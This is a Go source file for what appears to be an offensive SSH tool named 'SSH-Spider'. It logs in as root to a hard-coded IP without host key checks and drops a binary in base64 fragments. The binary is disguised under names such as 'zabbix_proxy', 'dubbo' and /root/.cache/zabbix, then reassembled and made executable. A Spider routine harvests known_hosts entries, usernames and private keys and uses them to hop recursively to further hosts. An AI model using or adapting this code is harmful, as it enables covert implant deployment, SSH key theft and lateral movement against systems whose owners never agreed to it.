package main

import (
	"SSH-Spider/moudle"
	"encoding/base64"
	"flag"
	"fmt"
	"golang.org/x/crypto/ssh"
	"io/ioutil"
	"net"
	"strings"
	"time"
)

func main() {

	var curip, curusername, pkey, filename,fgloc,outputname string
	var count int

	flag.StringVar(&curip, "ip", "101.35.9.167", "input ip your want to start")
	flag.StringVar(&curusername, "username", "root", "input username")
	// /Users/puaking/.ssh /Users/puaking/Desktop/bjs.key
	flag.StringVar(&pkey, "pkey", "/Users/puaking/.ssh/test", "input the path of privatekey")
	flag.StringVar(&filename,"f","/Users/puaking/Desktop/Go_program/restart/Zombie/bin/zabbix_proxy","the file you want to upload")
	flag.IntVar(&count,"c",100,"the count of fragment you want")
	flag.StringVar(&fgloc,"fg","/root/.cache/zabbix","remote fragment location")
	flag.StringVar(&outputname,"o","dubbo","outputname")
	flag.Parse()
	//source := "127.0.0.1"


	if strings.HasSuffix(fgloc,"/"){
		fgloc = fgloc[:len(fgloc)-1]
	}

	fileinfo, err := ioutil.ReadFile(filename)
	if err != nil{
		fmt.Println("read file error")
		return
	}


	encodefile := base64.StdEncoding.EncodeToString(fileinfo)

	packagelen := len(encodefile) / count
	temp := ""


	info := moudle.IpInfo{
		Ip:   curip,
		Port: 22,
	}
	//
	config := &ssh.ClientConfig{
		User: curusername,
		Auth: []ssh.AuthMethod{
			moudle.PublicKeyAuthFunc(pkey),
		},
		Timeout: time.Duration(30) * time.Second,
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			return nil
		},
	}

	for{
		client,err := ssh.Dial("tcp", fmt.Sprintf("%v:%v", info.Ip, info.Port), config)
		cmd := ""
		cmd += fmt.Sprintf("mkdir -p %s",fgloc)
		if err == nil {
			_, err := moudle.RunCommand(client, cmd)
			if err == nil{
				fmt.Println("create dict success")
			}
			client.Close()
			break
		}
	}


	i := 0
	for i <= count {

		client, err := ssh.Dial("tcp", fmt.Sprintf("%v:%v", info.Ip, info.Port), config)
		if err == nil {
			fmt.Println("connect success")
			for i <= count{
				if i == count{
					temp = encodefile[i*packagelen:len(encodefile)]
				}else {
					temp = encodefile[i*packagelen:(i+1)*packagelen]
				}
				cmd := fmt.Sprintf("echo \"%v\" > %s/test%v",temp,fgloc,i)
				_, err := moudle.RunCommand(client, cmd)
				if err == nil {
					fmt.Printf("Send %v success\n",i)
					i++
					continue
				}else {
					break
				}
			}

		}

	}

	finalpath := fmt.Sprintf("%s/%s",fgloc,outputname)

	for{
		client2,err := ssh.Dial("tcp", fmt.Sprintf("%v:%v", info.Ip, info.Port), config)
		j := 0
		cmd := ""
		for j < count{
			cmd += fmt.Sprintf("cat %s/test%v >> %s2 && ",fgloc,j,finalpath)
			j++
		}
		cmd += fmt.Sprintf("cat %s/test%v >> %s2",fgloc,count,finalpath)
		if err == nil {
			_, err := moudle.RunCommand(client2, cmd)
			if err == nil{
				fmt.Println("success")
			}
			client2.Close()
			break
		}
	}


	for{
		client3,err := ssh.Dial("tcp", fmt.Sprintf("%v:%v", info.Ip, info.Port), config)
		cmd := ""
		cmd += fmt.Sprintf("cat %s2 | base64 -d > %s && chmod +x %s",finalpath,finalpath,finalpath)
		if err == nil {
			_, err := moudle.RunCommand(client3, cmd)
			if err == nil{
				fmt.Println("base64 and chmod success")
			}
			client3.Close()
			break
		}
	}

	//moudle.SshPath[curip] = moudle.SshInfo{
	//	Source:         source,
	//	IpInfo:         info,
	//	TargetUsername: curusername,
	//	PkPath:         pkey,
	//}
	//
	//curkhlist, curpklist := GetSshInfo(client, "")
	//
	//if len(curkhlist) != 0 {
	//	Spider(curkhlist, curpklist, curip, client, "")
	//}
	//
	//client.Close()
	//
	//for _, info := range moudle.SshPath {
	//	fmt.Println(info.Ip)
	//	fmt.Println(info.TargetUsername)
	//	fmt.Println("From:" + info.Source)
	//	fmt.Println("privatekey_path: " + info.PkPath)
	//	fmt.Println("")
	//}
	//
	//for num, info := range moudle.PkInfolist.Pkvalue {
	//	handle := moudle.InitFile(strconv.Itoa(num) + "_pk")
	//	handle.WriteString(info)
	//}

}

func Spider(iplist, pkpath []string, source string, client *ssh.Client, conntemplate string) {

	for _, curip := range iplist {
		//防止访问自己
		if curip == source {
			continue
		}
		for _, pk := range pkpath {
			for _, curusername := range moudle.UserList {
				var curkhlist []string
				info := moudle.IpInfo{
					Ip:   curip,
					Port: 22,
				}

				cmdtemplate := fmt.Sprintf("ssh -o ConnectTimeout=1  %s@%s -i %s ", curusername, curip, pk)
				cmdtemplate = conntemplate + cmdtemplate
				cmd := cmdtemplate + "whoami"
				_, err := moudle.RunCommand(client, cmd)
				if err != nil {
					continue
				}
				moudle.SshPath[curip] = moudle.SshInfo{
					Source:         source,
					IpInfo:         info,
					TargetUsername: curusername,
					PkPath:         pk,
				}

				curkhlist, curpklist := GetSshInfo(client, cmdtemplate)

				if len(curkhlist) != 0 {
					Spider(curkhlist, curpklist, curip, client, cmdtemplate)
				}

			}
		}
	}
}

func GetSshInfo(client *ssh.Client, sshtemplate string) (curkhlist, curpklist []string) {

	homedir := moudle.FindHomeDir(client, sshtemplate)

	khlist, username, plist := moudle.FindSSHDir(client, homedir, sshtemplate)
	for _, kh := range khlist {
		curkhlist = append(curkhlist, moudle.HandleKnownHosts(kh)...)
	}

	moudle.UserList = append(moudle.UserList, username...)
	moudle.UserList = moudle.RemoveDuplicateElement(moudle.UserList)

	moudle.PkInfolist.Pkvalue = append(moudle.PkInfolist.Pkvalue, plist.Pkvalue...)
	moudle.PkInfolist.Pkvalue = moudle.RemoveDuplicateElement(moudle.PkInfolist.Pkvalue)
	curpklist = moudle.RemoveDuplicateElement(plist.Pkpath)

	curkhlist = moudle.RemoveDuplicateElement(curkhlist)
	return curkhlist, curpklist
}
